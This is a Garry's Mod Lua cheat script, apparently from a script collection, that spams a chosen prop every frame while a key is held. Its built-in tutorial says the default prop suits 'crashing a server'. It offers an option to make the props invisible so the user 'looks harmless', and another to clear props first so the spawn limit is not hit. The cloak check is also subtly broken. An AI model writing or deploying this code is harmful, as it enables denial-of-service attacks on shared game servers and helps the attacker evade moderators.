--[[
	Scripts/50.lua
	Coolman699 | (STEAM_0:1:11427632)
	===DStream===
]]

local Prop = CreateClientConVar("spam_prop", "models/props_c17/playgroundslide01.mdl", true, false)
local Delete = CreateClientConVar("spam_cleanup", "1", true, false)
local Cloak = CreateClientConVar("spam_cloak", "1", true, false)


function Spam()
	RunConsoleCommand("gm_spawn", Prop:GetString())
	if Cloak:GetBool() then	
		for _, v in pairs(ents.GetAll()) do
			if v:GetClass() == "prop_physics" && v:GetClass() == Prop:GetString() then
				v:SetColor(255,255,255,0)
			end
		end
	end
end

concommand.Add("+spam", function()
	if Delete:GetBool() then
		RunConsoleCommand("gmod_cleanup")
	end
	hook.Add("Think", "spam", Spam)
end)

concommand.Add("-spam", function()
	hook.Remove("Think", "spam")
end)

function Tutorial()
	print("_________________________________\nspam_prop\nThe path of the prop that the script will spam, the default is best suited for crashing a server.\n\nspam_cloak")
	print("Should the script cloak the prop that you are spamming? This will make you look harmless, but you can be caught through the logs.\n")
	print("spam_cleanup\nClean your props up before you start spamming? Made specifically so you don't hit the spam limit")
	print("_________________________________")
end
concommand.Add("spam_tutorial", Tutorial)

chat.AddText(Color(255,0,0), "Spam script loaded, for instructions type spam_tutorial in to console")